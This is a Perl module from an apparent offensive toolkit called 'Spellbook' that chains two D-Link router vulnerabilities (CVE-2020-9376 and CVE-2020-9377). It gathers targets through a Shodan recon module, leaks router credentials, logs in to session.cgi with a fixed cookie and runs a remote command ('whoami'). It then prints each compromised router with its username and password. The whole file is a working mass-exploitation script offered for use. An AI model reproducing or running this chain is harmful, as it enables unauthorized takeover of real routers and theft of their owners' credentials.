package Spellbook::Exploit::Fullchain_DLINK {
    use strict;
    use warnings;
    use HTTP::Request;
    use HTTP::Headers;
    use LWP::UserAgent;
    use Spellbook::Recon::Shodan;
    use Spellbook::Advisory::CVE_2020_9376;
    use Spellbook::Advisory::CVE_2020_9377;
    use Data::Dumper;
    
    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, @results);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            "h|help"     => \$help,
            "t|target=s" => \$target
        );

        if ($target) {
            my @targets = Spellbook::Recon::Shodan -> new (["--target" => 1]);

            foreach my $router (@targets) {
                my $credentials = Spellbook::Advisory::CVE_2020_9376 -> new (["--target" => $router]);

                if ($credentials) {
                    my ($username, $password) = split /:/, $credentials;

                    if (!$password) { $password = "admin"; }

                    if ($username) {
                        if ($router !~ /^http(s)?:\/\//) { $router = "http://$router"; }

                        my $userAgent = LWP::UserAgent->new();
                        my $payload   = "REPORT_METHOD=xml&ACTION=login_plaintext&USER=$username&PASSWD=$password&CAPTCHA=";
                        
                        my $headers   = HTTP::Headers->new (
                            "Content-Type" => "application/x-www-form-urlencoded",
                            "Cookie" => "uid=dLktm5OJdn",
                            "User-Agent" => "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0",
                            "Accept" => "*/*",
                            "Accept-Language" => "en-US,en;q=0.5",
                            "Accept-Encoding" => "gzip, deflate",
                            "Origin" => "$router",
                            "Referer" => "$router/",
                            "Connection" => "keep-alive"
                        );

                        my $request   = HTTP::Request -> new("POST", "$router/session.cgi", $headers, $payload);
                        my $response  = $userAgent -> request($request);
                        
                        if ($response -> is_success) {                            
                            my @exploit = Spellbook::Advisory::CVE_2020_9377 -> new ([
                                "--target" => $router,
                                "--cookie" => "dLktm5OJdn",
                                "--payload" => "whoami"
                            ]);
                            
                            if ($exploit[0] ne "Authenication fail") {
                                print "$router => $username / $password / dLktm5OJdn\n";
                                push @results, @exploit;
                            }
                        }
                    }
                }
            }

            return @results;
        }

        if ($help) {
            return "
                \rExploit::Fullchain_DLINK
                \r=======================
                \r-h, --help     See this menu
                \r-t, --target   Define a target\n\n";
        }

        return 0;
    }
}

1;